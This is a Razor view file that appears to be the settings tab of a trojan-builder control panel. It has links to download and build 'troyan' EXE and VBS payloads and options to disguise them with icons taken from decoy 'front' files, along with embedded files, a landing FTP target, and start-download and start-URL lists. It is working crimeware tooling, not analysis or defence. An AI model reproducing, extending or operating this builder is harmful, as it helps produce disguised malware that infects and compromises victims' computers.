@model model.TabModel


<div class="form-group">
    <label>Tracking Serie</label>
    <input name="TrackSerie" value="@Model.TrackSerie" class="form-control"/>
    <span class="text-danger"></span>

    <label>
        <input type="checkbox" name="TrackDesktop" value="true" @(Model.TrackDesktop ? "checked" : "")/> Put file with Tracking Serie/Number on desktop
    </label>
    <span class="text-danger"></span>
</div>

<div class="form-group">
    <label>
        <input type="checkbox" name="DisableVirus" value="true" @(Model.DisableVirus ? "checked" : "")/> Disable Virus
    </label>
    <span class="text-danger"></span>
</div>

<!-- Icon Upload -->
<div class="form-group">
    <img class="icon-preview" src="@Model.Server/GetIcon" alt="Icon Preview" class="img-thumbnail"/>

    <label>
        <input type="checkbox" name="ExtractIconFromFront" value="true" @(Model.ExtractIconFromFront ? "checked" : "")/> Extract Icon From Front
    </label>
    <span class="text-danger"></span>
</div>

<div class="form-group">
    <label for="iconFile">Upload Icon (ICO file)</label>
    <input type="file" id="iconFile" name="iconFile" accept=".ico" class="form-control-file">
    <span class="text-danger"></span>
</div>

<div class="form-group">
    <h5>Troyan</h5>
    <a href="@Model.Server/GetExe">Download troyan</a>
    <span class="text-danger"></span>
</div>

<div class="form-group">
    <h5>Troyan VBS</h5>
    <a href="@Model.Server/GetVbs">Download troyan VBS</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <a href="@Model.Server/1/2/BuildVbs">Buid troyan VBS</a>
    <span class="text-danger"></span>
</div>

<div class="form-group">
    <h5>Lite Troyan VBS</h5>
    <a href="@Model.Server/GetLiteVbs">Download Lite troyan VBS</a>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <a href="@Model.Server/1/2/BuildLiteVbs">Buid Lite troyan VBS</a>
    <span class="text-danger"></span>
</div>

<hr/>
<div class="form-group">
    <label>
        <input type="checkbox" name="LandingAuto" value="true" @(Model.LandingAuto ? "checked" : "")/> Auto Landing
    </label>
    <span class="text-danger"></span>

    <label>Landing Name</label>
    <input name="LandingName" value="@Model.LandingName" class="form-control"/>
    <span class="text-danger"></span>

    <label>Landing Ftp</label>
    <input name="LandingFtp" value="@Model.LandingFtp" class="form-control"/>
    <span class="text-danger"></span>
</div>
<hr/>

<div class="form-group">
    <label>Pushes</label>
    <textarea name="Pushes" class="form-control" rows="3">
        @foreach (var push in Model.Pushes)
        {
            @push.Trim()
            @if (Model.Pushes.IndexOf(push) < Model.Pushes.Count - 1)
            {
                @Html.Raw(Environment.NewLine)
            }
        }
                                        </textarea>
    <span class="text-danger"></span>
</div>


<div class="frame">
    <div class="form-group">
        <label>StartDownloads</label>
        <textarea name="StartDownloads" class="form-control" rows="3">
            @foreach (var startDn in Model.StartDownloads)
                {
                    @startDn.Trim()
                    @if (Model.StartDownloads.IndexOf(startDn) < Model.StartDownloads.Count - 1)
                    {
                    @Html.Raw(Environment.NewLine)
                }
            }
                                </textarea>
        <span class="text-danger"></span>
    </div>
</div>

<div class="frame">
    <div class="form-group">
        <label>StartUrls</label>
        <textarea name="StartUrls" class="form-control" rows="3">
                                        @foreach (var startUrl in Model.StartUrls)
            {
            @startUrl.Trim()
            @if (Model.StartUrls.IndexOf(startUrl) < Model.StartUrls.Count - 1)
            {
            @Html.Raw(Environment.NewLine)
            }
            }
                                </textarea>
        <span class="text-danger"></span>
    </div>
</div>


<div class="form-group">
    <label>Front</label>
    <div class="file-upload-container">
        <label for="frontInput">Upload Files</label>
        <input type="file" id="frontInput" name="newFront" multiple>
        <ul id="frontList" class="file-upload-list">
        </ul>
    </div>
</div>

<div class="form-group">
    <label>Embeddings</label>
    <div class="file-upload-container">
        <label for="embeddingsInput">Upload Files</label>
        <input type="file" id="embeddingsInput" name="newEmbeddings" multiple>
        <ul id="embeddingsList" class="file-upload-list">
        </ul>
    </div>
</div>